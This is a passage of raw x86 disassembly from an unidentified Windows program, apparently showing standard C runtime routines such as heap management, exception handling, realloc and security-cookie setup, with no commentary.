  427148:	test   ebx,ebx
  42714a:	mov    DWORD PTR [ebp+0x8],ebx
  42714d:	je     0x427167
  42714f:	push   ebx
  427150:	call   0x426c0c
  427155:	pop    ecx
  427156:	mov    ecx,DWORD PTR [ebx+0x10]
  427159:	mov    DWORD PTR [ecx],eax
  42715b:	mov    eax,DWORD PTR [ebx+0x10]
  42715e:	cmp    DWORD PTR [eax],0xffffffff
  427161:	jne    0x42708b
  427167:	xor    eax,eax
  427169:	jmp    0x4272e8
  42716e:	shl    ecx,1
  427170:	inc    edi
  427171:	test   ecx,ecx
  427173:	jge    0x42716e
  427175:	mov    ecx,DWORD PTR [ebp-0xc]
  427178:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42717c:	mov    ecx,DWORD PTR [edx]
  42717e:	sub    ecx,DWORD PTR [ebp-0x10]
  427181:	mov    esi,ecx
  427183:	sar    esi,0x4
  427186:	dec    esi
  427187:	cmp    esi,0x3f
  42718a:	mov    DWORD PTR [ebp-0x8],ecx
  42718d:	jle    0x427192
  42718f:	push   0x3f
  427191:	pop    esi
  427192:	cmp    esi,edi
  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
